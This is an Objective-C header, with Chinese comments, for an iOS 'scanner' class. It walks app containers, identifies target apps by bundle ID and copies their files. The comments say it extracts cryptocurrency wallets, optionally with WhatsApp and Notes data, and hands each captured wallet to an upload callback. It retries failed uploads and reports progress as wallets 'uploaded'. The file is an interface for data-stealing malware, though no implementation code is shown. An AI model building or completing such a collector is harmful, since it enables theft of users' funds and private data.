#import <Foundation/Foundation.h>
#import "WQLTargets.h"

NS_ASSUME_NONNULL_BEGIN

/// 采集流程：枚举容器 → 反查 bundleID → 命中目标则取 extension → 拷贝文件
@interface WQLScanner : NSObject

/// inode 扫描上界，0 = 用基线自动取
@property (nonatomic, assign) uint64_t maxInode;

/// 单容器/单目录拷贝门限，默认 800MB
@property (nonatomic, assign) uint64_t maxContainerBytes;

/// 是否把 extras（WhatsApp / 备忘录）也一起带走
@property (nonatomic, assign) BOOL includeExtras;

/// 是否采集备忘录（主库 + Accounts 图片）。默认 NO
@property (nonatomic, assign) BOOL includeNotes;

/// 进度文本回调（任意线程）：用于状态栏「扫描 63% · 已传 3 个钱包」
@property (nonatomic, copy, nullable) void (^progressBlock)(NSString *text);

/// 补传上次没传成功的包（Documents/wql_pending）。返回成功个数
- (NSUInteger)flushPendingUploads;

/// 上一轮是否真正进入了扫描阶段（通道不可用 / 没有 App Group 时为 NO，
/// 调用方据此判断「首轮是否算完成」，避免一次失败就把首轮标记成跑完了）
@property (nonatomic, readonly) BOOL lastRunUsable;

/// 日志回调（任意线程）
@property (nonatomic, copy, nullable) void (^logBlock)(NSString *line);

/// 返回 YES 则中止
@property (nonatomic, copy, nullable) BOOL (^cancelBlock)(void);

/// 每采到一个钱包立刻回调：参数是待打包目录（含 _manifest.json）。
/// 由调用方负责打包上传，回调返回后该目录会被删除。
@property (nonatomic, copy, nullable) void (^uploadBlock)(NSString *stagingDir, NSString *walletName);

/// 默认根目录
- (NSArray<NSString *> *)defaultRoots;

/// 主流程。返回每个容器的记录字典：bundleId / path / target / status / files / bytes
- (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir;

@end

NS_ASSUME_NONNULL_END
